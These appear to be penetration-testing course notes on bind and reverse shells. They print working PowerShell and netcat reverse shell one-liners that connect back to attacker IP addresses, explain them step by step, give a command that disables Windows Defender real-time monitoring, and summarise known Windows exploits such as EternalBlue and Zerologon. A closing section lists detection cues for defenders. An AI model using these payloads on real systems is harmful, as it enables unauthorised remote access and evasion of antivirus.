## Bind Shell
Bind/Reverse Shell
- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

OS firewalls can be troublesome when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working successfully.

## Reverse Shell
We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected.

Windows defender can stop reverse shells due to malicious code.
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Disable AV
Reverse Shells
```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

## One-Liners Examined
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
#### Remove /tmp/f
```shell-session
rm -f /tmp/f; 
```
Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.
#### Make A Named Pipe
```shell-session
mkfifo /tmp/f; 
```
Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.
#### Output Redirection
```shell-session
cat /tmp/f | 
```
Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).
#### Set Shell Options
```shell-session
/bin/bash -i 2>&1 | 
```
Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).
#### Open a Connection with Netcat
```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```
Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

## PowerShell One-liner Explained
#### Powershell One-liner
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Calling PowerShell=
```cmd-session
powershell -nop -c 
```
Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes.
#### Binding A Socket
```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`
#### Setting The Command Stream
```cmd-session
$stream = $client.GetStream();
```
Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications.
#### Empty Byte Stream
```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```
Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
#### Stream Parameters
```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.
#### Set The Byte Encoding
```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text.
#### Invoke-Expression
```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```
Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer.
#### Show Working Directory
```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >
#### Sets Sendbyte
```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
#### Terminate TCP Connection
```cmd-session
$client.Close()"
```
This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MS08-067`        | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
| `Eternal Blue`    | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
| `PrintNightmare`  | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).                                                                                          |
| `BlueKeep`        | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
| `Sigred`          | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
| `SeriousSam`      | CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
| `Zerologon`       | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |
#### Payload Generation

|**Resource**|**Description**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|

#### Payload Types to Consider
- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

## Events To Watch For:
- `File uploads`: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.
- `Suspicious non-admin user actions`: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command `whoami` on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.
- `Anomalous network sessions`: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.
